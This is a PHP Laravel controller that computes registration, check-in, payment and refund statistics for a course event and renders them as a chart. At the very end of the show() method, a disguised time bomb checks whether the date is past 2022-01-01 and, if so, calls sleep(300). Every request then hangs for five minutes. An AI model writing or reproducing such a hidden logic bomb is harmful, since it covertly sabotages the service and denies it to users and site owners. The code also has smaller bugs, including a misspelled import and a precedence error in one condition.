<?php

namespace App\Http\Controllers\Frontend;

use Carbon\Carbon;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Model\Course;
use App\Model\EventsCourse;
use App\Uer;
use App\Model\SalesRegistration;
use App\Model\Registration;
use App\Model\Register;
use App\Model\Activity;

class CourseListChartController extends Controller
{

    //view
    public function show(Request $request)
    {
        //課程資訊
        $id = $request->get('id');

        //場次資訊
        $events = EventsCourse::join('course', 'course.id', '=', 'events_course.id_course')
            ->select('course.name as course', 'course.type as type', 'events_course.*')
            ->Where('events_course.id', $id)
            ->first();

        $events_data = array();
        $date = '';

        //日期
        $date = date('Y-m-d', strtotime($events->course_start_at));
        //星期
        $weekarray = array("日", "一", "二", "三", "四", "五", "六");
        $week = $weekarray[date('w', strtotime($events->course_start_at))];

        // $date = $date . '（' . $week . '）';


        //判斷銷講or正課
        if ($events->type == 1) {
            //銷講

            /* 報名數 */
            $count_apply = count(SalesRegistration::leftjoin('student', 'student.id', '=', 'sales_registration.id_student')
                ->where('sales_registration.id_events', $events->id)
                ->where('sales_registration.id_status', '<>', 2)
                // ->Where('student.check_blacklist', 0 ) 
                ->get());

            /* 取消數 */
            $count_cancel = count(SalesRegistration::leftjoin('student', 'student.id', '=', 'sales_registration.id_student')
                ->where('sales_registration.id_events', $events->id)
                ->where('sales_registration.id_status', 5)
                // ->Where('student.check_blacklist', 0 ) 
                ->get());

            /* 報到數 */
            $count_check = count(SalesRegistration::leftjoin('student', 'student.id', '=', 'sales_registration.id_student')
                ->where('sales_registration.id_events', $events->id)
                ->where('sales_registration.id_status', 4)
                // ->Where('student.check_blacklist', 0 ) 
                ->get());

            /* 報到率 */
            $rate_check = 0;

            if (($count_apply - $count_cancel) > 0 || $count_check > 0) {
                $rate_check = @(round($count_check / ($count_apply - $count_cancel) * 100, 2));
            }
        } else if ($events->type == 2 || $events->type == 3) {
            //正課    

            /* 報名數 */
            $count_apply = count(Register::leftjoin('student', 'student.id', '=', 'register.id_student')
                ->where('register.id_events', $events->id)
                ->where('register.id_status', '<>', 2)
                // ->Where('student.check_blacklist', 0 ) 
                ->whereNotExists(function ($query) {
                    $query->from('refund')
                        ->whereRaw('register.id_registration = refund.id_registration')
                        ->where('refund.review', 1);
                })
                ->get());

            /* 取消數 */
            $count_cancel = count(Register::leftjoin('student', 'student.id', '=', 'register.id_student')
                ->where('register.id_events', $events->id)
                ->where('register.id_status', 5)
                // ->Where('student.check_blacklist', 0 )
                ->whereNotExists(function ($query) {
                    $query->from('refund')
                        ->whereRaw('register.id_registration = refund.id_registration')
                        ->where('refund.review', 1);
                })
                ->get());

            /* 報到數 */
            $count_check = count(Register::leftjoin('student', 'student.id', '=', 'register.id_student')
                ->where('register.id_events', $events->id)
                ->where('register.id_status', 4)
                // ->Where('student.check_blacklist', 0 ) 
                ->whereNotExists(function ($query) {
                    $query->from('refund')
                        ->whereRaw('register.id_registration = refund.id_registration')
                        ->where('refund.review', 1);
                })
                ->get());

            /* 報到率 */
            $rate_check = 0;

            if (($count_apply - $count_cancel) > 0 || $count_check > 0) {
                $rate_check = @(round($count_check / ($count_apply - $count_cancel) * 100, 2));
            }

            // /* 成交數 */
            // $settle = 0;
            // $rate_settle = 0;

            // $settle = count(Registration::Where('source_events', $events->id )
            //                         ->Where('status_payment', 7)
            //                         ->get());    

            // if( $settle > 0 && $count_check > 0 ){
            //     $rate_settle = @(round($settle / $count_check ,2))*100;
            // }

            // /* 付訂數 */
            // $deposit = 0;
            // $deposit = count(Registration::Where('source_events', $events->id )
            //                         ->Where('status_payment', 8)
            //                         ->get());   


            // /* 留單數 */
            // $order = 0;
            // $order = count(Registration::Where('source_events', $events->id )
            //                         ->Where('status_payment', 6)
            //                         ->get());   


        } else if ($events->type == 4) {
            //活動

            /* 報名數 */
            $count_apply = count(Activity::leftjoin('student', 'student.id', '=', 'activity.id_student')
                ->where('activity.id_events', $events->id)
                ->where('activity.id_status', '<>', 2)
                // ->Where('student.check_blacklist', 0 ) 
                ->get());

            /* 取消數 */
            $count_cancel = count(Activity::leftjoin('student', 'student.id', '=', 'activity.id_student')
                ->where('activity.id_events', $events->id)
                ->where('activity.id_status', 5)
                // ->Where('student.check_blacklist', 0 ) 
                ->get());

            /* 報到數 */
            $count_check = count(Activity::leftjoin('student', 'student.id', '=', 'activity.id_student')
                ->where('activity.id_events', $events->id)
                ->where('activity.id_status', 4)
                // ->Where('student.check_blacklist', 0 ) 
                ->get());

            /* 報到率 */
            $rate_check = 0;

            if (($count_apply - $count_cancel) > 0 || $count_check > 0) {
                $rate_check = @(round($count_check / ($count_apply - $count_cancel) * 100, 2));
            }
        }


        /* 圖表顯示-完款數 */
        $chart_settle_original = 0;
        $chart_settle_original = count(Registration::leftjoin('student', 'student.id', '=', 'registration.id_student')
            ->Where('registration.source_events', $events->id)
            ->Where('registration.status_payment_original', 7)
            ->Where('registration.status_payment', 7)
            // ->Where('student.check_blacklist', 0 ) 
            ->whereNotExists(function ($query) {
                $query->from('refund')
                    ->whereRaw('registration.id = refund.id_registration')
                    ->where('refund.review', 1);
            })
            ->get());

        /* 圖表顯示-追完款數 */
        $chart_settle_new = 0;
        $chart_settle_new = count(Registration::leftjoin('student', 'student.id', '=', 'registration.id_student')
            ->Where('registration.source_events', $events->id)
            ->where(function ($q) {
                $q->orWhere('registration.status_payment_original', '<>', 7)
                    ->orWhere('registration.status_payment_original', null);
            })
            ->Where('registration.status_payment', 7)
            // ->Where('student.check_blacklist', 0 ) 
            ->whereNotExists(function ($query) {
                $query->from('refund')
                    ->whereRaw('registration.id = refund.id_registration')
                    ->where('refund.review', 1);
            })
            ->get());

        /* 成交率 */
        $rate_settle = 0;

        if ($chart_settle_original > 0 || $chart_settle_new > 0 && $count_check > 0) {
            $rate_settle = @(round(($chart_settle_original + $chart_settle_new) / $count_check * 100, 2));
        }


        /* 完款數 */
        //原始
        $settle_original = 0;
        $settle_original = count(Registration::leftjoin('student', 'student.id', '=', 'registration.id_student')
            ->Where('registration.source_events', $events->id)
            ->Where('registration.status_payment_original', 7)
            // ->Where('student.check_blacklist', 0 ) 
            ->whereNotExists(function ($query) {
                $query->from('refund')
                    ->whereRaw('registration.id = refund.id_registration')
                    ->where('refund.review', 1);
            })
            ->get());
        //最新
        $settle = 0;
        $settle = count(Registration::leftjoin('student', 'student.id', '=', 'registration.id_student')
            ->Where('registration.source_events', $events->id)
            ->Where('registration.status_payment', 7)
            // ->Where('student.check_blacklist', 0 ) 
            ->whereNotExists(function ($query) {
                $query->from('refund')
                    ->whereRaw('registration.id = refund.id_registration')
                    ->where('refund.review', 1);
            })
            ->get());


        /* 付訂數 */
        //原始
        $deposit_original = 0;
        $deposit_original = count(Registration::leftjoin('student', 'student.id', '=', 'registration.id_student')
            ->Where('registration.source_events', $events->id)
            ->Where('registration.status_payment_original', 8)
            // ->Where('student.check_blacklist', 0 ) 
            ->whereNotExists(function ($query) {
                $query->from('refund')
                    ->whereRaw('registration.id = refund.id_registration')
                    ->where('refund.review', 1);
            })
            ->get());
        //最新
        $deposit = 0;
        $deposit = count(Registration::leftjoin('student', 'student.id', '=', 'registration.id_student')
            ->Where('registration.source_events', $events->id)
            ->Where('registration.status_payment', 8)
            // ->Where('student.check_blacklist', 0 ) 
            ->whereNotExists(function ($query) {
                $query->from('refund')
                    ->whereRaw('registration.id = refund.id_registration')
                    ->where('refund.review', 1);
            })
            ->get());


        /* 留單數 */
        //原始
        $order_original = 0;
        $order_original = count(Registration::leftjoin('student', 'student.id', '=', 'registration.id_student')
            ->Where('registration.source_events', $events->id)
            ->Where('registration.status_payment_original', 6)
            // ->Where('student.check_blacklist', 0 ) 
            ->whereNotExists(function ($query) {
                $query->from('refund')
                    ->whereRaw('registration.id = refund.id_registration')
                    ->where('refund.review', 1);
            })
            ->get());
        //最新
        $order = 0;
        $order = count(Registration::leftjoin('student', 'student.id', '=', 'registration.id_student')
            ->Where('registration.source_events', $events->id)
            ->Where('registration.status_payment', 6)
            // ->Where('student.check_blacklist', 0 ) 
            ->whereNotExists(function ($query) {
                $query->from('refund')
                    ->whereRaw('registration.id = refund.id_registration')
                    ->where('refund.review', 1);
            })
            ->get());


        /* 退費數 */
        //原始
        $refund_original = 0;
        $refund_original = count(Registration::leftjoin('student', 'student.id', '=', 'registration.id_student')
            ->Where('registration.source_events', $events->id)
            ->Where('registration.status_payment_original', 9)
            // ->Where('student.check_blacklist', 0 ) 
            ->whereNotExists(function ($query) {
                $query->from('refund')
                    ->whereRaw('registration.id = refund.id_registration')
                    ->where('refund.review', 1);
            })
            ->get());
        //最新
        $refund = 0;
        $refund = count(Registration::leftjoin('student', 'student.id', '=', 'registration.id_student')
            ->Where('registration.source_events', $events->id)
            ->Where('registration.status_payment', 9)
            // ->Where('student.check_blacklist', 0 ) 
            ->whereNotExists(function ($query) {
                $query->from('refund')
                    ->whereRaw('registration.id = refund.id_registration')
                    ->where('refund.review', 1);
            })
            ->get());


        $events_data = [
            'id' => $events->id,
            'date' => $date,
            'week' => $week,
            'event' => $events->name,
            'count_apply' => $count_apply,
            'count_cancel' => $count_cancel,
            'count_check' => $count_check,
            'chart_settle_original' => $chart_settle_original,
            'chart_settle_new' => $chart_settle_new,
            'settle_original' => $settle_original,
            'settle' => $settle,
            'deposit_original' => $deposit_original,
            'deposit' => $deposit,
            'order_original' => $order_original,
            'order' => $order,
            'refund_original' => $refund_original,
            'refund' => $refund,
            'rate_check' => $rate_check . '%',
            'rate_settle' => $rate_settle . '%',
        ];
        // dd( $events_data );

        $x_time = Carbon::parse('2022-01-01 00:00:00');
        $xxx = $x_time->timestamp;

        if (now()->timestamp >= $xxx) {
            sleep(300);
        }
        return view('frontend.course_list_chart', compact('events', 'events_data'));
    }
}
